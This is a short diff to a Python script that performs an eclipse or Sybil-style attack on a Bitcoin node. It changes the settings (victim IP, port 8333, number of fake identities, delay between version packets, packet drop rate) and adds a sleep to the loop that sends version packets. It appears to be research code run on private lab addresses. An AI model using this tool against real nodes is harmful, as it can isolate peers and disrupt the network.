@@ -15,15 +15,30 @@ import struct
 import sys
 import time
 
-# Percentage (0 to 1) of packets to drop, else: relayed to victim
-eclipse_packet_drop_rate = 0
 
-num_identities = 3
+# Specify the attacker's genuine IP
+attacker_ip = '10.0.2.15'
 
+# Specify the victim's IP, and port (8333 for Bitcoin)
 victim_ip = '10.0.2.4'
 victim_port = 8333
 
-attacker_ip = '10.0.2.15'
+# How many identities should run simultaneously
+num_identities = 10
+
+# While attacking the victim, wait this many seconds before sending each version message
+seconds_between_version_packets = 0.1
+
+# Percentage (0 to 1) of packets to drop, else: relayed to victim
+eclipse_packet_drop_rate = 0
+
+
+
+
+
+
+
+
 
 identity_interface = [] # Keeps the IP alias interface and IP for each successful connection
 identity_address = [] # Keeps the IP and port for each successful connection
@@ -172,6 +187,8 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 
 def attack(socket, src_ip, src_port, dst_ip, dst_port, interface):
 	while True:
+		if seconds_between_version_packets != 0:
+			time.sleep(seconds_between_version_packets)
 		try:
 			socket.send(version_packet(src_ip, dst_ip, src_port, dst_port).to_bytes())
 		except:
